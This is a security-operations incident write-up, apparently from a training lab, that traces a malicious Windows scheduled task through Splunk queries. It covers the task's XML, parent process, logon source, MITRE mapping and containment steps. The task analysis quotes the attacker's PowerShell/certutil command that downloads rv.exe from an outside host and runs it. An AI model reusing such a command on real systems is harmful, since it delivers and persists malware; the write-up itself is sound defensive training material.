  # Potential Task Scheduler Persistence Identified

---

##  Alert Information

| Field | Value |
|--------|--------|
| Alert Name | Potential Task Scheduler Persistence Identified |
| Time | 30/08/2025 10:06:07 AM |
| Host | WIN-H015 |
| User | oliver.thompson |
| Task Name | \AssessmentTaskOne |
| Log Source | Windows Security Event Logs |
| Event Code | 4698 (Scheduled Task Created) |

---

#  Investigation Objective

To determine:

- Whether the scheduled task is malicious  
- What payload is executed  
- How it was created  
- Who created it  
- From where the attacker logged in  
- Whether persistence and privilege escalation occurred  

---

#  Step 1 – Validate the Alert (EventCode 4698)

## Query Used

```spl
index="win-alert" EventCode=4698 AssessmentTaskOne
| table _time EventCode user_name host Task_Name Message
```

## Finding

A scheduled task named `\AssessmentTaskOne` was created by:

- **User:** oliver.thompson  
- **Host:** WIN-H015  

Event 4698 confirms **Scheduled Task Creation**.

---

# 🧠 Step 2 – Analyze the Task Content (Message Field)

The XML content inside the `Message` field was reviewed to determine task behavior.

---

##  Triggers Section Analysis

```xml
<CalendarTrigger>
  <StartBoundary>2025-08-30T10:15:00</StartBoundary>
  <ScheduleByDay>
    <DaysInterval>1</DaysInterval>
  </ScheduleByDay>
</CalendarTrigger>
```

### Observation

- The task runs **daily**
- Starts at **10:15 AM**
- Task is **enabled**

⚠️ A daily scheduled task on a user workstation is suspicious and often indicates persistence.

---

##  Exec Section Analysis

```xml
<Command>powershell.exe</Command>
<Arguments>
-Command "certutil.exe -urlcache -f http://tryhotme:9876/rv.exe 
C:\Users\OLIVER~1.THO\AppData\Local\Temp\3\DataCollector.exe; 
Start-Process C:\Users\OLIVER~1.THO\AppData\Local\Temp\3\DataCollector.exe"
</Arguments>
```

### Malicious Indicators

- Uses `certutil.exe` to download a file (LOLBIN abuse)
- Downloads from suspicious domain: `http://tryhotme:9876/rv.exe`
- Saves payload as: `DataCollector.exe`
- Executes payload via PowerShell `Start-Process`
- Runs executable from **Temp directory**

---

##  Why This Is Malicious

- `certutil.exe` is commonly abused for malware delivery
- Executable downloaded from unknown domain
- Execution from user Temp directory
- Scheduled daily → Establishes persistence

This confirms **Persistence + Malware Deployment Behavior**.

---

##  Principals Section Analysis

```xml
<UserId>WIN-H015\oliver.thompson</UserId>
<LogonType>InteractiveToken</LogonType>
<RunLevel>LeastPrivilege</RunLevel>
```

### Observation

- Task runs under `oliver.thompson`
- Uses Interactive Token
- Least Privilege execution

This strongly suggests the user account was compromised.

---

#  Step 3 – Identify Parent Process

From Event 4698 metadata:

```
ClientProcessId: 5816
ParentProcessId: 4128
```

## Query Used

```spl
index=win-alert ProcessId=5816 AssessmentTaskOne
```

### Result

Parent Process: **cmd.exe**

---

#  Step 4 – Investigate Parent Process Activity

## Query Used

```spl
index=win-alert ComputerName=WIN-H015 ParentProcessId=4128
| table _time ParentCommandLine CommandLine
```

### Result

```
net localgroup administrators
```

### Analysis

The attacker executed:

```
net localgroup administrators
```

This indicates:

- Privilege discovery
- Checking administrative access
- Possible preparation for privilege escalation

---

#  Step 5 – Identify Logon Source (EventCode 4624)

To determine the origin of the login:

## Query Used

```spl
index=win-alert EventCode=4624 workstation_name="Dev-QA-SERVER" Account_Name="oliver.thompson"
```

### Finding

Workstation Name:

```
Dev-QA-SERVER
```

This confirms the attacker logged in from **Dev-QA-SERVER**.

---

# Attack Chain Summary

1. Threat actor logs in using compromised account  
2. Login originates from **Dev-QA-SERVER**  
3. Executes `cmd.exe`  
4. Enumerates Administrators local group  
5. Creates malicious scheduled task  
6. Task runs PowerShell + certutil  
7. Downloads and executes `rv.exe`  
8. Establishes persistence via daily execution  

---

#  MITRE ATT&CK Mapping

| Technique | ID | Description |
|------------|------|-------------|
| Scheduled Task | T1053.005 | Persistence via scheduled task |
| Command Shell | T1059.003 | cmd.exe usage |
| PowerShell | T1059.001 | Malicious PowerShell execution |
| Ingress Tool Transfer | T1105 | Downloading payload |
| Account Discovery | T1087 | `net localgroup` enumeration |
| Valid Accounts | T1078 | Use of compromised credentials |

---

#  Impact Assessment

- Persistence established  
- Malware downloaded and executed  
- Privilege enumeration performed  
- Lateral movement potential identified  
- Account compromise confirmed  

**Severity: High**

---

# Recommended Response Actions

## Immediate Actions

- Disable `oliver.thompson` account  
- Remove scheduled task:

```cmd
schtasks /delete /tn "AssessmentTaskOne" /f
```

- Isolate host `WIN-H015`  
- Block domain `tryhotme`  
- Reset compromised credentials  

---

## Further Investigation

Check for:

- Lateral movement attempts  
- Additional scheduled tasks  
- Newly created admin accounts  
- Suspicious services  
- Network connections to port 9876  

---

#  Lessons Learned

- Monitor Event ID 4698 (Scheduled Task Creation)  
- Alert on `certutil.exe` downloading executables  
- Monitor abnormal PowerShell usage  
- Detect local admin enumeration activity  
- Monitor scheduled task creation from user endpoints  

---

#  Conclusion

The alert was a **True Positive**.

Investigation confirmed:

- Account compromise  
- Persistence mechanism established  
- Malware deployment attempt  
- Privilege discovery activity  

The attacker leveraged:

- Valid credentials  
- Built-in Windows utilities (LOLBins)  
- Scheduled Task persistence  

---

#  Final Verdict

- **Incident Classification:** Confirmed Compromise  
- **SOC Level:** Escalated to L2 / Incident Response  
- **Severity:** High  
- **Status:** Active Investigation / Containment Required  
